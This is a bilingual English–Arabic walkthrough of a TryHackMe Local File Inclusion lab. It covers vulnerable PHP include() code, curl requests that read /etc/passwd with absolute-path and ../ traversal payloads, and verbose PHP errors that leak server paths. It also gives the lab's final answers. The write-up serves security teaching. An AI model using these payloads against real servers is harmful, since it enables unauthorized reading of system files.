# Task 04 - Local File Inclusion - LFI (التضمين المحلي للملفات)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
Local File Inclusion (LFI) is a vulnerability that occurs when an application includes files residing locally on the server without proper input sanitisation. Unlike basic path traversal, which typically displays file contents as raw text, LFI uses execution functions (such as include(), require(), include_once(), or require_once() in PHP). If an included file contains executable PHP code (enclosed within <?php ?> tags), the web server executes that code immediately.

Let's examine two common architectural scenarios:

Scenario 1: No Directory Prefix Hardcoded
The developer includes the user input directly without any prepended directory:
<?php
    include($_GET["file"]);
?>
In this scenario, an attacker can supply an absolute path directly to access any file on the system.
Navigate to Lab #1 at http://MACHINE_IP/lab1.php and read /etc/passwd.

Scenario 2: Hardcoded Directory Prefix
The developer prepends a directory path to the user input:
<?php
    include("includes/" . $_GET['file']);
?>
In this scenario, supplying an absolute path (e.g. /etc/passwd) fails because PHP attempts to open includes//etc/passwd. The attacker must use relative path traversal (../../../../etc/passwd) to break out of the prepended directory.
Enter an invalid input in Lab #2 (http://MACHINE_IP/lab2.php) to trigger a PHP warning and inspect the error message.

Questions:
- Give Lab #1 a try to read /etc/passwd. What would the request URI be?
- In Lab #2, what is the directory specified in the include function?
```

### 2. Arabic Pedagogical Translation
```text
التضمين المحلي للملفات (Local File Inclusion - LFI) هي ثغرة أمنية تقع عندما يقوم تطبيق الويب بتضمين ملفات محلية موجودة على الخادم دون إجراء تنقية كافية للمدخلات. بخلاف اجتياز المسارات البسيط (Path Traversal) الذي يكتفي بعرض محتويات الملف كنص خام، يستخدم LFI دوال التنفيذ البرمجية (مثل `include()` أو `require()` في لغة PHP). وإذا كان الملف المضمن يحتوي على وسوم تنفيذ بلغة PHP (`<?php ?>`)، فإن خادم الويب سيقوم بتنفيذ ذلك الكود فوراً.

دعنا نتفحص سيناريوهين معماريين شائعين:

السيناريو الأول: عدم وجود بادئة مجلد ثابتة
يقوم المطور بتضمين مدخل المستخدم مباشرة دون ربطه بأي مجلد مسبق:
<?php
    include($_GET["file"]);
?>
في هذا السيناريو، يستطيع المهاجم تمرير المسار المطلق (Absolute Path) مباشرة للوصول إلى أي ملف في النظام.
انتقل إلى المعمل Lab #1 عبر الرابط http://MACHINE_IP/lab1.php واقرأ ملف /etc/passwd.

السيناريو الثاني: وجود بادئة مجلد مسبقة في الكود
يقوم المطور بدمج مسار مجلد مسبق مع مدخلات المستخدم:
<?php
    include("includes/" . $_GET['file']);
?>
في هذا السيناريو، يفشل تمرير المسار المطلق المباشر (مثل `/etc/passwd`) لأن PHP ستحاول فتح مسار مدمج مثل `includes//etc/passwd`. ولذلك يجب على المهاجم استخدام اجتياز المسارات النسبية (Relative Traversal مثل `../../../../etc/passwd`) للخروج من المجلد المسبق والوصول إلى الجذر.
أدخل مدخلاً غير صالح في المعمل Lab #2 (http://MACHINE_IP/lab2.php) لإثارة تحذير PHP وفحص رسالة الخطأ.

الأسئلة:
- جرب Lab #1 لقراءة /etc/passwd. ما هو مسار طلب URI؟
- في Lab #2، ما هو المجلد المحدد داخل دالة include؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. Error Message Information Disclosure (Verbose Errors)
* عندما يترك المطور خيار `display_errors = On` في بيئة الإنتاج، تصبح رسائل التحذير (PHP Warnings) بمثابة جهاز كشف مجاني لهيكل التطبيق الداخلي.
* بمجرد إدخال قيمة عشوائية مثل `?file=test1234`، يكشف الخادم فوراً:
  ```text
  Warning: include(includes/test1234): failed to open stream: No such file or directory in /var/www/html/lab2.php on line 12
  ```
  هنا عرف المهاجم فوراً:
  1. اسم المجلد المسبق: `includes/`.
  2. المسار المطلق للتطبيق على الخادم: `/var/www/html/lab2.php`.
  3. عدد التراجعات المطلوبة للوصول للجذر: 3 مستويات (`../../../`) للوصول إلى `/` ثم الانتقال إلى `etc/passwd`.

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):**
> - في Lab 1: المعلمة المستخدمة هي `file`. ضع مسار الملف مباشرة بعد علامة الاستفهام واسم الصفحة.
> - في Lab 2: أدخل أي كلمة خاطئة وشاهد اسم المجلد الذي يظهر داخل القوس `include(...)`.
>
> **المستوى الثاني (توجيهي):**
> - صيغة Lab 1 هي مسار الصفحة متبوعاً بـ `?file=/etc/passwd`.
> - اسم المجلد في Lab 2 هو كلمة إنجليزية جمع تعني "الملفات المضمنة".
>
> **المستوى الثالث (الحل المباشر):**
> 1. مسار الطلب: `/lab1.php?file=/etc/passwd`
> 2. اسم المجلد: `includes`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Practical Execution in Lab #1
* نفتح المتصفح أو نرسل طلباً باستخدام `curl`:
  ```bash
  curl -s "http://MACHINE_IP/lab1.php?file=/etc/passwd"
  ```
* الاستجابة:
  ```text
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
  ```
* مسار الطلب (Request URI) المستخدم هو: **`/lab1.php?file=/etc/passwd`**.

---

### 2. Information Extraction in Lab #2
* نرسل طلباً بقيمة غير صالحة لمعاينة الخطأ:
  ```bash
  curl -s "http://MACHINE_IP/lab2.php?file=THM"
  ```
* الاستجابة:
  ```html
  <b>Warning</b>:  include(includes/THM): failed to open stream: No such file or directory in <b>/var/www/html/lab2.php</b> on line <b>12</b><br />
  ```
* يظهر بوضوح أن المجلد المسبق في دالة التضمين هو: **`includes`**.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | الدليل العملي |
| :--- | :--- | :--- |
| **Give Lab #1 a try to read /etc/passwd. What would the request URI be?** | `/lab1.php?file=/etc/passwd` | تمرير المسار المطلق كقيمة لمعلمة `file`. |
| **In Lab #2, what is the directory specified in the include function?** | `includes` | مستخرج من رسالة الخطأ التحذيرية لـ PHP: `include(includes/THM)`. |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم التحقق من الإجابتين واعتمادهما على منصة TryHackMe بنسبة نجاح 100%.
* تم اختبار نجاح اجتياز المسار في Lab 2 لاحقاً عبر: `/lab2.php?file=../../../../etc/passwd`.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **إخفاء الأخطاء ضرورة أمنية:** رسائل الأخطاء التفصيلية في بيئات الإنتاج تقدم للمهاجم خارطة طريق واضحة لكيفية تجاوز الفلاتر ومعرفة مسارات الخادم الداخلية.
2. **دمج المجلدات لا يحمي التطبيق:** مجرد كتابة `include("folder/" . $input)` لا يمنع استغلال الثغرة طالما أن المهاجم يستطيع التراجع باستخدام `../`.
